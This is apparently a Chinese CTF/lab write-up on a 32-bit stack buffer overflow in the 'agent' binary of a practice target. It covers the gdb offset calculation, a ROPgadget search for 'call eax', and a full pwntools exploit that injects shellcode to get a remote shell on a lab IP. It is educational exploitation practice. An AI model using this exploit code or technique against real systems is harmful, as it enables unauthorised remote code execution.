由于此靶机已被大佬们发过很多复现过程，这里主要介绍一下针对缓冲区溢出漏洞的思路。

## 一、文件分析

### 1.1 查看文件保护

 **首先使用file命令查看文件信息**

    
    
    file agent
    checksec agent
    

![image-20210910231245207](https://image.3001.net/images/20210926/1632670359_615092974bb5a55d6dba5.png!small)  
可以看到文件基本信息：32位、小端序、动态链接程序，且存在 **可读可写可执行段。**

### 1.2 伪代码分析

将agent文件拖入32位的IDA中进行分析，  
按shift+f12没找到system('/bin/sh')相关内容，  
按F5查看伪代码。

    
    
    int __cdecl main(int argc, const char **argv, const char **envp)
    {
      int result; // eax
      char *s2; // [esp+8h] [ebp-20h] BYREF
      char s[10]; // [esp+Eh] [ebp-1Ah] BYREF
      int v6; // [esp+18h] [ebp-10h]
      char v7; // [esp+1Fh] [ebp-9h]
    
      setbuf(stdout, 0);
      asprintf(&s2, "%i", 48093572);	
      //asprintf()可以说是一个增强版的sprintf(),在不确定字符串的长度时，能够根据格式化的字符串长度，申请足够的内存空间。
    
      puts("  ___ __  __ ___ ");
      puts(" |_ _|  \\/  | __|  Agent");
      puts("  | || |\\/| | _|   Reporting");
      puts(" |___|_|  |_|_|    System\n");
      printf("\nAgent ID : ");
      if ( !fgets(s, 9, stdin) )
        return -1;
      if ( !strncmp(s, s2, 8u) )	//strncmp函数为字符串比较函数，功能是把 str1 和 str2 进行比较，最多比较前 n 个字节，若str1与str2的前n个字符相同，则返回0；若s1大于s2，则返回大于0的值；若s1 小于s2，则返回小于0的值。
      {
        do
          v7 = getchar();
        while ( v7 != 10 && v7 != -1 );
        puts("Login Validated ");
        v6 = menu();
        switch ( v6 )
        {
          case 1:
            extractionpoints();
            break;
          case 2:
            requestextraction();
            break;
          case 3:
            report();	//溢出函数
            break;
          default:
            puts("Exiting...");
            break;
        }
        result = 0;
      }
      else
      {
        puts("Invalid Agent ID ");
        result = -2;
      }
      return result;
    }
    

下面是溢出函数report，

    
    
    {
      char s[152]; // [esp+4h] [ebp-A4h] BYREF
      char *v2; // [esp+9Ch] [ebp-Ch]
    
      printf("\nEnter report update: ");
      gets(s);	//溢出点
      printf("Report: %s\n", s);
      puts("Submitted for review.");
      v2 = s;
      return s;
    }
    

看完伪代码后总结下，溢出的位置不难找，只要控制report中的gets函数读入填充的数据，即可产生栈溢出，但是没有shellcode，需要我们自己写入RWX段，然后将函数的返回地址改为shellcode地址。

### 1.3 gdb分析

使用gdb分析，计算栈偏移，首先在fgets函数那里打个断点。  
![image-20210913100627665](https://image.3001.net/images/20210927/1632708834_615128e2b424c7c37624d.png!small)

    
    
    gdb ./agent
    b *0x8048697
    r
    n
    

然后输入48093572（这里主要是越过strncmp函数，需要让S2与S相同）。

    
    
    48093572
    

![image-20210913100826421](https://image.3001.net/images/20210927/1632708836_615128e44a6e3a85c31cc.png!small)

之后一直按n步过到menu，输入3进入report函数。

![image-20210913101128110](https://image.3001.net/images/20210927/1632708838_615128e6206d13ca976c8.png!small)

执行到call report这里步过之后，按s步入，之后继续步过到gets函数，输入'AAAAAAAA'

![image-20210913103236292](https://image.3001.net/images/20210927/1632708840_615128e8007110414fe05.png!small)

输入stack48在栈中找到EBP和字符串'AAAAAAAA'的位置。

    
    
    stack 48
    

输入的'AAAAAAAA'在eax中，位置如下：

![image-20210913102839844](https://image.3001.net/images/20210927/1632708842_615128eadad3328db074f.png!small)

指向栈低的指针EBP位置如下：

![image-20210913103020177](https://image.3001.net/images/20210927/1632708844_615128ec87a9052c74249.png!small)

从而计算得出栈偏移为

    
    
    栈偏移 = EBP地址 - 当前输入地址 + EBP字长
           = 0xd188 - 0xd0e4 + 4 = 168
    

找到栈偏移之后，我们需要将return地址修改为shellcode地址，这里可以使用ROPgadget寻找包含call eax的代码段，这里找到call
eax地址为0x8048563。

    
    
    ROPgadget --binary agent | grep "call eax"
    

![image-20210913092619882](https://image.3001.net/images/20210927/1632708846_615128ee5b18339f6f379.png!small)

## 二、EXP编写

这里放上自己用pwntools，通过asm构造shellcode内容，需要安装pwntools库，写完之后直接运行就getshell了。

    
    
    from pwn import *
    io = remote("192.168.56.6", 7788)   //需修改为靶机IP、端口
    shellcode = asm(shellcraft.sh())	//生成payload
    shell_addr = 0x8048563	//call eax的地址
    io.recvuntil(b"Agent ID : ")
    io.send(b"48093572\n")	//绕过strncmp函数
    io.recvuntil(b"Enter selection: ")
    io.send(b"3\n") //选择进入report函数
    io.recv()
    io.sendline(shellcode + b"A" * (168 - len(shellcode))  + p32(shell_addr))
    io.interactive()
    
    
    
    python3 shell.exp
    

![image-20210913094329263](https://image.3001.net/images/20210927/1632708848_615128f03e08efbbdb170.png!small)

